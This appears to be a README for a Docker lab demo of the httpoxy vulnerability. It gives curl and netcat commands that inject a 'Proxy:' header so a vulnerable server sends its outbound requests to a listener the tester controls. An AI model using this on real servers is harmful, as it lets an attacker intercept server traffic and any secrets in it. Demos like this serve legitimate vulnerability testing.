# httpoxy-vuln

Completely and utterly stolen from [php-fpm-httpoxy-poc](https://github.com/httpoxy/php-fpm-httpoxy-poc), however that proof of concept doesn't work out of the box and bending it to a testing end seemed all together decent.

## Steps

This is how the vulnerability works:

1. Send a header with 'Proxy: yourproxyserver:port' to a target
2. observe a CONNECT request in yourproxyserver:port tcp/http(s)

## Using this demo

Here is how you can see it in action:

1. rebuild and run the whole docker thing

    ```
    ./rebuild.sh
    ```

2. Start some sort of capturing proxy:

    `nc -l 12345`

3. test that the container running at 192.168.99.100, attempts to proxy out 192.168.0.6:12345...

    ```
    curl -H 'Proxy: 192.168.0.6:12345' 192.168.99.100
    ```



